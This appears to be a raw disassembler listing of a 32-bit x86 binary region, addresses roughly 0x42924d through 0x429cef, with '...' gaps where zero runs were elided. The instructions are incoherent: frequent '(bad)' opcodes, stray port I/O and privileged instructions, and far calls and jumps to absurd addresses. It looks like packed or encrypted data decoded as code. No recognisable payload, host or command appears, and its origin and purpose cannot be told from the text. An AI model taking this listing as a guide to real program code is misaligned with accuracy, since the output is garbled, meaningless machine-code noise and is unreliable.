  42924d:	gs sar BYTE PTR es:0xccd456b7,cl
  429255:	dec    ebx
  429256:	outs   dx,BYTE PTR ds:[esi]
  429257:	aam    0xa9
  429259:	cmp    edi,DWORD PTR [edx-0x6bfb4550]
  42925f:	outs   dx,DWORD PTR ds:[esi]
  429260:	and    ebp,eax
  429262:	imul   edx,DWORD PTR [eax-0x51],0x77
  429266:	mov    al,0x3a
  429268:	sbb    al,0xcf
  42926a:	xchg   ecx,eax
  42926b:	(bad)  
  42926c:	adc    al,0xf5
  42926e:	cmp    eax,0x93491277
  429273:	gs sub al,cl
  429276:	and    DWORD PTR [eax+ecx*2],ecx
  429279:	daa    
  42927a:	add    DWORD PTR [esi],edx
  42927c:	js     0x4292ac
  42927e:	addr16 shl esp,cl
  429281:	sub    BYTE PTR [eax-0x44556ae3],al
  429287:	hlt    
  429288:	or     ebx,edx
  42928a:	gs or  eax,0xd534348a
  429290:	test   eax,0xb1c8fc4c
  429295:	ror    DWORD PTR [esi+0x73],1
  429298:	mov    esi,eax
  42929a:	lahf   
  42929b:	add    al,0x57
  42929d:	sbb    dl,BYTE PTR [edi-0x2b614d68]
  4292a3:	mov    DWORD PTR [ecx-0x5],edi
  4292a6:	test   BYTE PTR [ebx-0x10544d22],dh
  4292ac:	into   
  4292ad:	dec    esp
  4292ae:	or     eax,0x44ae0f66
  4292b3:	jno    0x429296
  4292b5:	fwait
  4292b6:	idiv   DWORD PTR [esi]
  4292b8:	pop    edi
  4292b9:	aas    
  4292ba:	imul   ebx,DWORD PTR [esi],0x5b34c95d
  4292c0:	jae    0x429250
  4292c2:	cmc    
  4292c3:	jno    0x429264
  4292c5:	cmp    eax,0xeea00f8b
  4292ca:	adc    DWORD PTR [ebp+0x31e5a3c2],edi
  4292d0:	mov    es,WORD PTR [esp+eax*1-0x48]
  4292d4:	push   esp
  4292d5:	and    BYTE PTR [edi],al
  4292d7:	jle    0x429322
  4292d9:	xchg   edx,eax
  4292da:	in     al,dx
  4292db:	lahf   
  4292dc:	bound  edi,QWORD PTR [ebx+0x44]
  4292df:	inc    ebx
  4292e0:	cmp    DWORD PTR [edx+0x2915ed38],esi
  4292e6:	(bad)  
  4292e7:	jmp    0x429362
  4292e9:	dec    eax
  4292ea:	dec    edx
  4292eb:	aad    0xea
  4292ed:	push   ebp
  4292ee:	hlt    
  4292ef:	mov    ch,0x7b
  4292f1:	nop
  4292f2:	pop    ebp
  4292f3:	sub    esp,DWORD PTR [ebx+0x6863222d]
  4292f9:	out    0xa0,al
  4292fb:	mov    ebp,0x679158ae
  429300:	xor    BYTE PTR [ebx+0x53e8fdf2],al
  429306:	imul   edi,DWORD PTR [esp+eiz*4-0xf2622ec],0xc366de5e
  429311:	mov    edx,0xb3d73f4f
  429316:	inc    esi
  429317:	mov    WORD PTR [eax+0x52a8dc9d],fs
  42931d:	in     eax,0x3b
  42931f:	dec    esi
  429320:	jbe    0x4292fa
  429322:	enter  0x6063,0xf9
  429326:	sbb    ecx,DWORD PTR [esi+edi*8+0x13ec47be]
  42932d:	xchg   ecx,eax
  42932e:	pop    esi
  42932f:	fimul  DWORD PTR [edx+0x17]
  429332:	cmp    al,0xe5
  429334:	mov    bh,BYTE PTR [edi+0xbb523cc]
  42933a:	push   eax
  42933b:	sbb    eax,0x8bdba333
  429340:	add    BYTE PTR fs:[eax],al
	...
  4293b3:	add    BYTE PTR [esi],cl
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	loope  0x4293e5
  4293c2:	pop    ss
  4293c3:	mov    esi,0x1b539
  4293c8:	cmc    
  4293c9:	add    BYTE PTR [eax],al
  4293cb:	add    BYTE PTR [esi],ah
  4293cd:	inc    ebx
  4293ce:	sbb    eax,DWORD PTR [ecx+0x1bd2517d]
  4293d4:	imul   esi,ecx,0x31fb2db6
  4293da:	mov    BYTE PTR [edi+0x32a7aae7],ch
  4293e0:	pop    ds
  4293e1:	xchg   ebx,eax
  4293e2:	pop    ebp
  4293e3:	push   esi
  4293e4:	sahf   
  4293e5:	in     eax,dx
  4293e6:	adc    edi,DWORD PTR [ecx+edx*1]
  4293e9:	imul   ebx,edx,0xb411c978
  4293ef:	rol    bh,1
  4293f1:	ret    
  4293f2:	inc    eax
  4293f3:	sti    
  4293f4:	jae    0x4293fa
  4293f6:	or     ch,BYTE PTR ds:0xa86ffb08
  4293fc:	lea    esp,[edx+ebp*4-0x8]
  429400:	xchg   edx,eax
  429401:	lock xchg ecx,eax
  429403:	inc    edx
  429404:	add    eax,0x2d2ae05e
  429409:	in     eax,0x50
  42940b:	jbe    0x4293c5
  42940d:	and    al,0x4e
  42940f:	out    0xfc,al
  429411:	and    DWORD PTR [ebp+0x4e],esp
  429414:	sbb    edi,edx
  429416:	pusha  
  429417:	dec    esp
  429418:	dec    ebp
  429419:	mov    bl,0xc6
  42941b:	loop   0x429412
  42941d:	mov    bh,0x53
  42941f:	lods   eax,DWORD PTR ds:[esi]
  429420:	add    ch,BYTE PTR [esi]
  429422:	repz inc eax
  429424:	push   eax
  429425:	lea    ebx,[ebx+0x73]
  429428:	lods   al,BYTE PTR ds:[esi]
  429429:	xor    eax,0x2dc5e61f
  42942e:	out    dx,al
  42942f:	ret    0xa506
  429432:	adc    ebx,DWORD PTR [ebx]
  429434:	int    0x44
  429436:	sbb    ah,BYTE PTR [esi+esi*2]
  429439:	dec    esp
  42943a:	aad    0x2d
  42943c:	inc    ebx
  42943d:	shr    BYTE PTR [esp+ecx*8+0x5cdf2a9c],1
  429444:	adc    bh,dh
  429446:	cwde   
  429447:	test   BYTE PTR [ebp+0x2a],cl
  42944a:	ins    DWORD PTR es:[edi],dx
  42944b:	jo     0x429488
  42944d:	lea    eax,[ebx-0xd]
  429450:	jmp    0x6015e215
  429455:	xlat   BYTE PTR ds:[ebx]
  429456:	push   es
  429457:	imul   edi,DWORD PTR [edx],0x7104804d
  42945d:	inc    esp
  42945e:	jge    0x4294df
  429460:	in     eax,0x53
  429462:	outs   dx,DWORD PTR ds:[esi]
  429463:	pop    ebx
  429464:	sahf   
  429465:	inc    edi
  429466:	adc    al,0xe
  429468:	test   eax,0x808944e
  42946d:	mov    esi,0x947fc7a9
  429472:	jmp    0xd4225253
  429477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429478:	or     si,WORD PTR [edi+0x57dad366]
  42947f:	sbb    eax,0x54c77777
  429484:	and    bh,al
  429486:	in     al,dx
  429487:	mov    eax,DWORD PTR [ecx]
  429489:	jle    0x429436
  42948b:	or     eax,0x60edbb1a
  429490:	loope  0x429511
  429492:	push   ebx
  429493:	push   esi
  429494:	icebp  
  429495:	push   ecx
  429496:	push   edi
  429497:	mov    edi,0xe8099d39
  42949c:	(bad)  
  42949d:	pop    ds
  42949e:	push   ecx
  42949f:	icebp  
  4294a0:	pop    ebx
  4294a1:	cmp    bl,cl
  4294a3:	xchg   ebx,eax
  4294a4:	fcmovbe st,st(2)
  4294a6:	shl    DWORD PTR [ecx+0x2bb4f29f],0x93
  4294ad:	cld    
  4294ae:	retf   
  4294af:	pushf  
  4294b0:	pop    edi
  4294b1:	or     al,0x85
  4294b3:	pop    ds
  4294b4:	fisttp QWORD PTR [edi-0x37e13cca]
  4294ba:	mov    esp,0x1aa8cf97
  4294bf:	ins    DWORD PTR es:[edi],dx
  4294c0:	lods   eax,DWORD PTR ds:[esi]
	...
  429531:	add    BYTE PTR [eax],al
  429533:	add    BYTE PTR [ecx-0xa],dl
  429536:	xor    eax,0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0xe6dcc4f3
  429542:	lahf   
  429543:	outs   dx,BYTE PTR ds:[esi]
  429544:	cs mov dh,0x1
  429547:	add    ch,dh
  429549:	add    BYTE PTR [eax],al
  42954b:	add    BYTE PTR [ecx+edx*8+0x48],bl
  42954f:	lock mov DWORD PTR [ebx-0x588a1796],edi
  429556:	mov    cl,0xb3
  429558:	icebp  
  429559:	jns    0x4294de
  42955b:	pop    ebx
  42955c:	sbb    eax,0x18d7d2dd
  429561:	out    dx,al
  429562:	in     al,dx
  429563:	lods   eax,DWORD PTR ds:[esi]
  429564:	sub    DWORD PTR [eax],edi
  429566:	test   DWORD PTR [esp+eiz*4],esp
  429569:	xor    dl,BYTE PTR [eax*8-0x5894daee]
  429570:	mov    eax,ds:0x944ce76e
  429575:	fidiv  DWORD PTR [ecx+eiz*4-0x45951859]
  42957c:	inc    ebp
  42957d:	adc    eax,0x74468b21
  429582:	aaa    
  429583:	mov    ds:0xef2153fb,al
  429588:	imul   eax,DWORD PTR [ebp-0x7d0affa9],0xf5591cf7
  429592:	jo     0x42957d
  429594:	(bad)  
  429595:	hlt    
  429596:	inc    esi
  429597:	aad    0x82
  429599:	add    eax,0x30f4afe3
  42959e:	mov    dh,0x79
  4295a0:	lock push ebx
  4295a2:	leave  
  4295a3:	sub    edx,DWORD PTR [ebp+0x5c]
  4295a6:	xor    eax,0x32070613
  4295ab:	inc    BYTE PTR [eax]
  4295ad:	out    dx,eax
  4295ae:	(bad)  
  4295af:	mov    ebp,0xbd669670
  4295b4:	xchg   BYTE PTR [esi+0x3d5757c9],ah
  4295ba:	imul   ecx,ebx,0x23
  4295bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295be:	into   
  4295bf:	or     BYTE PTR [ebx-0x7c],bl
  4295c2:	inc    edi
  4295c3:	push   es
  4295c4:	and    esi,esp
  4295c6:	sar    DWORD PTR [ebx-0x17],cl
  4295c9:	mov    ds:0x8ccd7ec6,eax
  4295ce:	mov    dl,0x30
  4295d0:	cmp    bl,BYTE PTR [edi]
  4295d2:	imul   edi,DWORD PTR [ebp+0xd],0xce214485
  4295d9:	mov    ebp,0x4220f2b1
  4295de:	mov    al,BYTE PTR [ecx+0x1beeec9c]
  4295e4:	int3   
  4295e5:	jl     0x42962b
  4295e7:	and    al,0x9a
  4295e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295ea:	dec    esi
  4295eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295ec:	es adc eax,0xeaacf67a
  4295f2:	sbb    al,0x7f
  4295f4:	jp     0x429652
  4295f6:	push   eax
  4295f7:	inc    eax
  4295f8:	mov    ch,0xf2
  4295fa:	cmp    DWORD PTR [edi],eax
  4295fc:	test   DWORD PTR [ebx],ebx
  4295fe:	jmp    0x16802789
  429603:	mov    ebx,0xdc662da8
  429608:	adc    dh,0x5a
  42960b:	jecxz  0x429651
  42960d:	xchg   DWORD PTR [ebp+0x135f22f7],ebx
  429613:	(bad)  
  429614:	lahf   
  429615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429616:	das    
  429617:	cwde   
  429618:	push   0x64cc5aa3
  42961d:	add    eax,DWORD PTR [edx+0xf]
  429620:	fwait
  429621:	rdtsc  
  429623:	pop    esi
  429624:	fild   QWORD PTR [edx]
  429626:	adc    cl,BYTE PTR [ebx]
  429628:	mov    ch,0x1e
  42962a:	and    bh,ch
  42962c:	mov    ecx,0x9615f14
  429631:	mov    dh,0xcc
  429633:	nop    DWORD PTR [esi+edx*4+0x77e4466d]
  42963b:	jmp    DWORD PTR [edi]
  42963d:	ffree  st(3)
  42963f:	pusha  
	...
  4296b4:	push   esi
  4296b5:	pop    ebx
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	(bad)  
  4296c1:	sub    eax,0xb723525b
  4296c6:	add    DWORD PTR [eax],eax
  4296c8:	cmc    
  4296c9:	add    BYTE PTR [eax],al
  4296cb:	add    bl,bl
  4296cd:	add    eax,0x34b6be83
  4296d2:	jb     0x4296d1
  4296d4:	inc    esp
  4296d5:	sub    al,0xd9
  4296d7:	dec    edi
  4296d8:	push   edi
  4296d9:	dec    ebx
  4296da:	xchg   esp,eax
  4296db:	daa    
  4296dc:	pusha  
  4296dd:	dec    esi
  4296de:	push   cs
  4296df:	push   ebx
  4296e0:	gs inc esi
  4296e2:	jl     0x4296f2
  4296e4:	and    esp,DWORD PTR cs:[esi]
  4296e7:	mov    ebp,0x6410832b
  4296ec:	jo     0x42972a
  4296ee:	sbb    ch,dl
  4296f0:	jecxz  0x4296b3
  4296f2:	cs push ss
  4296f4:	or     DWORD PTR ds:0xbc51231d,ebx
  4296fa:	dec    edx
  4296fb:	mov    ecx,0xf0b93780
  429700:	mov    eax,ds:0xb52aa76b
  429705:	ins    BYTE PTR es:[edi],dx
  429706:	int    0x1e
  429708:	xchg   ecx,eax
  429709:	call   0xbf9c:0x2b973904
  429710:	mov    WORD PTR [ebp-0x4],gs
  429713:	dec    ecx
  429714:	ss xchg esp,eax
  429716:	mov    ch,0xa9
  429718:	pop    esi
  429719:	and    dh,BYTE PTR [eax-0x6ef95e92]
  42971f:	mov    cl,ch
  429721:	sub    dl,cl
  429723:	nop
  429724:	fwait
  429725:	sub    al,0xce
  429727:	push   0x381defbf
  42972c:	sub    bl,BYTE PTR [edi]
  42972e:	add    al,0x4c
  429730:	mov    DWORD PTR [edx-0x9],edi
  429733:	mov    ebp,DWORD PTR [ebx]
  429735:	(bad)  
  429736:	xchg   edi,eax
  429737:	push   ds
  429738:	in     eax,0x6c
  42973a:	in     eax,dx
  42973b:	lahf   
  42973c:	jbe    0x42976f
  42973e:	cmp    cl,cl
  429740:	mov    eax,0xaa1f3281
  429745:	pop    ebx
  429746:	jae    0x42973d
  429748:	ror    BYTE PTR [ebx+ebx*8-0x19],cl
  42974c:	xlat   BYTE PTR ds:[ebx]
  42974d:	test   al,0x6b
  42974f:	fucomi st,st(5)
  429751:	xchg   ecx,eax
  429752:	(bad)  
  429753:	mov    cl,0x6d
  429755:	cmp    esi,DWORD PTR [edi+ebp*4-0x2bd209e3]
  42975c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42975d:	loop   0x42978f
  42975f:	jmp    FWORD PTR [ebp+0x1b6e88b3]
  429765:	leave  
  429766:	add    dl,BYTE PTR [esi-0x50]
  429769:	outs   dx,DWORD PTR ds:[esi]
  42976b:	scas   eax,DWORD PTR es:[edi]
  42976c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42976d:	adc    esp,0x4a9cbcc1
  429773:	mov    dl,0xa8
  429775:	jecxz  0x4297cf
  429777:	mov    BYTE PTR [ecx-0x22],dl
  42977a:	test   DWORD PTR [edx+edx*2],eax
  42977d:	sub    dh,BYTE PTR [esi+0x42]
  429780:	cld    
  429781:	dec    edx
  429782:	cmc    
  429783:	push   edx
  429784:	(bad)
  429788:	push   ds
  429789:	loop   0x4297c8
  42978b:	iret   
  42978c:	fist   WORD PTR ds:0x58db35bb
  429792:	cmp    eax,0x7d18c234
  429797:	sub    BYTE PTR [edx+0x4619f057],ch
  42979d:	push   ss
  42979e:	sti    
  42979f:	fld    TBYTE PTR [edx]
  4297a1:	dec    edx
  4297a2:	pusha  
  4297a3:	pop    ds
  4297a4:	add    DWORD PTR [ecx+0x66],edx
  4297a7:	adc    bl,0xa6
  4297aa:	sub    dl,0x96
  4297ad:	test   BYTE PTR [eax+0x4a815807],al
  4297b3:	jmp    0x6d8a9f2c
  4297b8:	xchg   ebx,eax
  4297b9:	mov    ebx,0xafbd1b93
  4297be:	(bad)  
  4297bf:	push   edi
  4297c0:	inc    DWORD PTR [eax]
	...
  429832:	add    BYTE PTR [eax],al
  429834:	es jp  0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    DWORD PTR [ecx+0x7f],eax
  429842:	jns    0x4297fe
  429844:	sbb    BYTE PTR [eax+0xf50001],bh
  42984a:	add    BYTE PTR [eax],al
  42984c:	add    BYTE PTR [edi],0x90
  42984f:	mov    al,ds:0x37b37e83
  429854:	dec    esi
  429855:	or     BYTE PTR [eax],al
  429857:	mov    esp,0xe88b6327
  42985c:	fld    DWORD PTR [ecx]
  42985e:	dec    esp
  42985f:	inc    esi
  429860:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  429862:	xlat   BYTE PTR ds:[ebx]
  429863:	dec    edi
  429864:	imul   ecx,DWORD PTR [ebx+edx*1-0x56],0xffffffce
  429869:	mov    esp,DWORD PTR [ebx+0x354060e7]
  42986f:	dec    esi
  429870:	jno    0x42981b
  429872:	pop    es
  429873:	sar    dl,cl
  429875:	add    BYTE PTR [edx+0x58],bl
  429878:	(bad)  
  429879:	cmp    al,0xe6
  42987b:	int    0xc9
  42987d:	enter  0xe65e,0x1e
  429881:	rol    DWORD PTR [edi],cl
  429883:	adc    BYTE PTR [ebx],al
  429885:	rcr    ch,0xdb
  429888:	pop    ss
  429889:	mov    ebp,0xd8463062
  42988e:	pop    eax
  42988f:	retf   
  429890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429891:	pushf  
  429892:	or     al,BYTE PTR [edx+0xf]
  429895:	das    
  429896:	and    eax,0x486ea2bf
  42989b:	ins    DWORD PTR es:[edi],dx
  42989c:	aas    
  42989d:	lods   eax,DWORD PTR ds:[esi]
  42989e:	les    ecx,FWORD PTR [edi-0x26]
  4298a1:	push   ds
  4298a2:	and    cl,BYTE PTR [esi]
  4298a4:	scas   eax,DWORD PTR es:[edi]
  4298a5:	xor    al,0xa3
  4298a7:	hlt    
  4298a8:	dec    ecx
  4298a9:	or     al,0x59
  4298ab:	sbb    DWORD PTR [ebx],ebp
  4298ad:	test   ah,dh
  4298af:	sub    ebp,DWORD PTR [esi+eax*1]
  4298b2:	cmp    eax,0x196a62dd
  4298b7:	and    ch,BYTE PTR [ebp+0x23]
  4298ba:	(bad)  
  4298bb:	cmp    esi,DWORD PTR [edx]
  4298bd:	in     al,dx
  4298be:	push   0x59
  4298c0:	popa   
  4298c1:	push   ds
  4298c2:	add    cl,BYTE PTR [ecx-0x40878490]
  4298c8:	out    dx,eax
  4298c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298ca:	xor    eax,0xf7d80303
  4298cf:	loop   0x42987e
  4298d1:	xchg   edi,eax
  4298d2:	shr    ebp,0x40
  4298d5:	ret    0x8fab
  4298d8:	mov    ebp,0xa24dfd59
  4298dd:	repz xor eax,0xc9efceca
  4298e3:	lds    ecx,FWORD PTR [esi-0x1d]
  4298e6:	and    eax,0x1cc2e0c3
  4298eb:	and    BYTE PTR [esi-0x2a],al
  4298ee:	sub    eax,0x612bdc11
  4298f3:	test   DWORD PTR [esi+0x46645ad3],edx
  4298f9:	and    eax,DWORD PTR [edi]
  4298fb:	dec    esp
  4298fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298fd:	inc    ebp
  4298fe:	sahf   
  4298ff:	pusha  
  429900:	sahf   
  429901:	sar    DWORD PTR [esi],0xfa
  429904:	std    
  429905:	pop    ss
  429906:	sbb    al,0x4b
  429908:	adc    eax,0xa6c30333
  42990d:	fcom   QWORD PTR [ecx-0x14]
  429910:	fisttp DWORD PTR [esi+0x7915db91]
  429916:	outs   dx,DWORD PTR ds:[esi]
  429917:	jecxz  0x4298bb
  429919:	mov    esp,DWORD PTR [ebx+ecx*1]
  42991c:	jns    0x42998d
  42991e:	das    
  42991f:	jne    0x4298b8
  429921:	(bad)  
  429922:	icebp  
  429923:	out    dx,al
  429924:	rcr    WORD PTR [edi+0x44456ff8],cl
  42992b:	into   
  42992c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42992d:	fadd   st(0),st
  42992f:	pop    es
  429930:	sbb    eax,0x1eda75f4
  429935:	pop    esi
  429936:	ret    0xfa33
  429939:	(bad)  
  42993a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42993b:	adc    al,0x2c
  42993d:	add    DWORD PTR ds:[edi+edi*4],ebp
	...
  4299b1:	add    BYTE PTR [eax],al
  4299b3:	add    BYTE PTR [ebp+0xc],cl
  4299b6:	clc    
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    DWORD PTR [esi+0xd9c3eb5],ecx
  4299c5:	mov    ecx,0xf50001
  4299ca:	add    BYTE PTR [eax],al
  4299cc:	push   ebp
  4299cd:	jp     0x429a38
  4299cf:	jnp    0x4299b3
  4299d1:	jmp    0x4299a1
  4299d3:	pop    ecx
  4299d4:	mov    al,ds:0x7ef4c51f
  4299d9:	adc    DWORD PTR [edx-0x356b3361],0x25b2c308
  4299e3:	cmp    esi,eax
  4299e5:	sbb    ebp,eax
  4299e7:	mov    bh,0x62
  4299e9:	leave  
  4299ea:	repnz add ch,ch
  4299ed:	sbb    DWORD PTR [ebx+eiz*4+0x4b],ebx
  4299f1:	nop
  4299f2:	nop
  4299f3:	mov    eax,ds:0x86247931
  4299f8:	daa    
  4299f9:	dec    edx
  4299fa:	mov    ?,WORD PTR [eax+0x20]
  4299fd:	test   DWORD PTR [edi],esi
  4299ff:	push   ss
  429a00:	lock imul esp,DWORD PTR cs:[eax],0x5b
  429a05:	xor    al,0x3
  429a07:	or     DWORD PTR [ebp-0x6b1a95db],ebx
  429a0d:	pop    ecx
  429a0e:	add    al,0x88
  429a10:	outs   dx,DWORD PTR ds:[esi]
  429a11:	jbe    0x429a53
  429a13:	ja     0x429996
  429a15:	repz push ss
  429a17:	push   ecx
  429a18:	adc    bh,cl
  429a1a:	xor    bl,BYTE PTR [edi-0x22]
  429a1d:	sbb    al,0xfb
  429a1f:	int    0x88
  429a21:	repnz push edi
  429a23:	pusha  
  429a24:	xchg   edi,eax
  429a25:	mov    ch,ah
  429a27:	out    dx,al
  429a28:	mov    ebp,0x69224b4c
  429a2d:	cld    
  429a2e:	mov    dh,0xb4
  429a30:	mov    dl,0xac
  429a32:	mov    bh,0x99
  429a34:	lods   al,BYTE PTR ds:[esi]
  429a35:	shl    BYTE PTR [esi+0x75],cl
  429a38:	imul   ecx,DWORD PTR [esi],0xffffff8b
  429a3b:	popf   
  429a3c:	sub    eax,0x7b921ddc
  429a41:	dec    esp
  429a42:	push   0xffffffbf
  429a44:	jecxz  0x429a46
  429a46:	fcmovu st,st(6)
  429a48:	out    0xc,al
  429a4a:	add    ch,BYTE PTR [edi+ebx*1]
  429a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a4e:	and    BYTE PTR [ecx-0x1a3363a8],bh
  429a54:	mov    dl,0x31
  429a56:	(bad)  
  429a57:	mov    al,0x1b
  429a59:	pop    ecx
  429a5a:	ret    
  429a5b:	sbb    esp,DWORD PTR [esi-0x3cb8fa40]
  429a61:	in     eax,0x7
  429a63:	iret   
  429a64:	mov    eax,0xadffb722
  429a69:	sub    eax,0x4acd0458
  429a6e:	mov    eax,0xc3ad8282
  429a73:	retf   
  429a74:	push   esp
  429a75:	daa    
  429a76:	inc    ebp
  429a77:	mov    ah,0xb9
  429a79:	les    eax,FWORD PTR [ebp+0x2c756558]
  429a7f:	ins    BYTE PTR es:[edi],dx
  429a80:	ret    
  429a81:	adc    dh,cl
  429a83:	inc    edx
  429a84:	xchg   dl,bl
  429a86:	call   0x9828c592
  429a8b:	sbb    esi,ebx
  429a8d:	fwait
  429a8e:	test   DWORD PTR [ecx+0x3c],esp
  429a91:	sub    DWORD PTR [ebx-0x3e12909d],edx
  429a97:	pop    esp
  429a98:	or     DWORD PTR [edx+ebp*8],eax
  429a9b:	dec    esp
  429a9c:	sub    ebp,DWORD PTR [ebp-0x31]
  429a9f:	or     DWORD PTR [ebx],ecx
  429aa1:	jge    0x429a4e
  429aa3:	inc    ebx
  429aa4:	and    eax,0x60732e5b
  429aa9:	(bad)  
  429aaa:	xchg   ecx,eax
  429aab:	pop    es
  429aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429aad:	xchg   ebx,eax
  429aae:	data16 sub bh,dh
  429ab1:	clc    
  429ab2:	push   edi
  429ab3:	cld    
  429ab4:	ret    
  429ab5:	push   cs
  429ab6:	(bad)  
  429ab7:	cld    
  429ab8:	xor    eax,DWORD PTR [eax]
  429aba:	mov    DWORD PTR [edx+0x70b10284],esi
  429ac0:	sub    al,0x0
	...
  429b32:	add    BYTE PTR [eax],al
  429b34:	lds    edx,FWORD PTR [ebp-0x76]
  429b37:	cli    
  429b38:	call   0xe133:0xa97ff5ff
  429b3f:	ret    0x914b
  429b42:	xor    cl,BYTE PTR ds:0x1ba02
  429b48:	cmc    
  429b49:	add    BYTE PTR [eax],al
  429b4b:	add    BYTE PTR [esi+0x4429a2d1],dh
  429b51:	inc    esp
  429b52:	pop    ebp
  429b53:	mov    eax,DWORD PTR [ebx+eax*1+0x36]
  429b57:	addr16 cmp dl,ch
  429b5a:	rcr    BYTE PTR [ebx],0x1
  429b5d:	dec    edx
  429b5e:	mov    bh,0xe4
  429b60:	ds push ds
  429b62:	mov    dh,0xb4
  429b64:	retf   
  429b65:	sub    eax,0x73fa5912
  429b6a:	lock push ss
  429b6c:	fsub   st,st(1)
  429b6e:	xor    ah,BYTE PTR ds:0x9eeef0c3
  429b74:	ret    0x1c95
  429b77:	dec    edx
  429b78:	aaa    
  429b79:	iret   
  429b7a:	pop    es
  429b7b:	into   
  429b7c:	test   DWORD PTR [ebp+eiz*2+0x26],0x2515bdae
  429b84:	call   0xfd1f579d
  429b89:	(bad)  
  429b8b:	dec    ebx
  429b8c:	pop    eax
  429b8d:	icebp  
  429b8e:	jecxz  0x429b96
  429b90:	mov    ds:0xc876dce9,eax
  429b95:	mov    es,WORD PTR [ecx+0x2b]
  429b98:	dec    ecx
  429b99:	pop    esp
  429b9a:	outs   dx,BYTE PTR ds:[esi]
  429b9b:	inc    ecx
  429b9c:	mov    ds:0xeb4d1727,eax
  429ba1:	outs   dx,DWORD PTR ds:[esi]
  429ba2:	xchg   BYTE PTR [ebx+eiz*1-0x4e],al
  429ba6:	dec    eax
  429ba7:	mov    ebx,esp
  429ba9:	imul   esp,DWORD PTR [edi+0x6e],0xffffff95
  429bad:	inc    esp
  429bae:	xchg   ecx,eax
  429baf:	ins    BYTE PTR es:[edi],dx
  429bb0:	pop    esi
  429bb1:	(bad)  
  429bb2:	jbe    0x429ba3
  429bb4:	cs enter 0xa854,0x88
  429bb9:	pop    ebp
  429bba:	fisubr DWORD PTR [ebx+ebx*1-0x694c56c5]
  429bc1:	inc    ecx
  429bc2:	mov    ecx,0x686822e0
  429bc7:	and    al,0x3e
  429bc9:	les    esi,FWORD PTR [ecx+0x1a]
  429bcc:	in     eax,0xcf
  429bce:	adc    eax,0x255d034
  429bd3:	fidivr DWORD PTR [ecx+0x12]
  429bd6:	fisttp DWORD PTR ds:0x443a76d7
  429bdc:	or     edx,esi
  429bde:	(bad)
  429be2:	mov    bh,0xeb
  429be4:	fstp   DWORD PTR [ebx-0x7fe71a05]
  429bea:	(bad)  [esi]
  429bec:	or     BYTE PTR [edi],al
  429bee:	xor    esi,DWORD PTR [ebx]
  429bf0:	jle    0x429c4d
  429bf2:	(bad)  
  429bf3:	iret   
  429bf4:	adc    al,0x4a
  429bf6:	iret   
  429bf7:	add    ebp,DWORD PTR [edi+edx*4+0x21cbf535]
  429bfe:	popf   
  429bff:	add    cl,BYTE PTR [ebp-0x76]
  429c02:	ret    
  429c03:	sub    al,0xb6
  429c05:	push   ebx
  429c06:	fwait
  429c07:	sahf   
  429c08:	out    dx,al
  429c09:	(bad)
  429c0d:	aaa    
  429c0e:	xchg   BYTE PTR [eax-0x43],dh
  429c11:	fst    DWORD PTR [esi+ebp*2+0x63]
  429c15:	pop    ecx
  429c16:	jbe    0x429bad
  429c18:	cwde   
  429c19:	(bad)  
  429c1a:	aaa    
  429c1b:	adc    al,0x2b
  429c1d:	sub    BYTE PTR ds:0x45ede064,al
  429c23:	xor    BYTE PTR [eax+0x38],ch
  429c26:	shl    BYTE PTR [esi],cl
  429c28:	cmp    esi,DWORD PTR [esi]
  429c2a:	fsub   DWORD PTR [ebx+0x6e6e2052]
  429c30:	mov    DWORD PTR [ebp+0x39a93110],esi
  429c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c37:	pop    edi
  429c38:	inc    eax
  429c39:	and    ah,BYTE PTR [eax]
  429c3b:	push   ds
  429c3c:	(bad)  
  429c3d:	cli    
  429c3e:	sub    BYTE PTR [esi+0x20],dh
	...
  429cb1:	add    BYTE PTR [eax],al
  429cb3:	add    BYTE PTR [ecx-0xace0e4b],al
  429cb9:	jne    0x429c7c
  429cbb:	mov    ch,0xdf
  429cbd:	xlat   BYTE PTR ds:[ebx]
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	adc    esi,DWORD PTR [ebp-0x3e]
  429cc3:	scas   al,BYTE PTR es:[edi]
  429cc4:	idiv   DWORD PTR [edx+0xf50001]
  429cca:	add    BYTE PTR [eax],al
  429ccc:	out    0xd7,eax
  429cce:	mov    es,eax
  429cd0:	adc    bh,ah
  429cd2:	mov    ebp,0xf311ca7
  429cd7:	out    dx,eax
  429cd8:	add    al,0xc6
  429cda:	or     BYTE PTR [edx+0x60],0x61
  429cde:	fistp  DWORD PTR [esp+eiz*8+0x7c]
  429ce2:	mov    edi,0x7d5ae5e6
  429ce7:	mov    DWORD PTR [esi-0x14],esp
  429cea:	xchg   BYTE PTR [ecx-0x19],al
  429ced:	pop    es
  429cee:	daa    
  429cef:	xor    dl,ch
